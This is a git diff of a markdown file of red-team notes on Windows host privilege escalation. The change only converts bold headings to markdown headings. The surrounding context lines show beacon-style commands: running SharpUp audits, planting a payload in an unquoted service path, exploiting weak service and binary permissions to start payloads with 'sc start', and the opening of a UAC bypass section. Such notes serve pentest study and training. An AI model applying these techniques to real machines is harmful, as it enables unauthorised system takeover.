@@ -1,6 +1,6 @@
 # Host Privilege Escalation Notes
 
-**Windows Services**
+## Windows Services
 
 Query services
 ```
@@ -15,7 +15,7 @@ Things of interest
 4. Log on As
 5. Dependants and Dependencies
 
-**Unquoted Service Paths**
+## Unquoted Service Paths
 
 Get all services and their path
 ```
@@ -32,7 +32,7 @@ Using SharpUp
 execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
 ```
 
-***Abusing***
+## Abusing
 
 If you have services that are named like Service 1.exe and not quoted we can abuse this by placing a Service.exe beacon in this file path which allows us to abuse it. Could also be the file path name to like *C:\Here is\Service 1.exe* we can drop a *C:\Here.exe* if we have permissions to abuse.
 ```
@@ -46,7 +46,7 @@ run sc start VulnService1
 ```
 
 
-**Weak Service Permissions**
+## Weak Service Permissions
 
 Check for modifiable services
 ```
@@ -74,7 +74,7 @@ run sc start VulnService2
 ```
 
 
-**Weak Service Binary Permissions**
+## Weak Service Binary Permissions
 
 This time the binary itself is able to be overwritten, checking for it's permissions. Make sure to download to keep as backup just in case. Also turn off the service before doing this, otherwise you will get helpmessage 32
 ```
@@ -86,7 +86,7 @@ upload C:\Payload\Service 3.exe
 run sc start VulnService3
 ```
 
-**UAC Bypasses**
+## UAC Bypasses
 
 Check for UAC, *medium mandatory* means UAC in this case
 ```
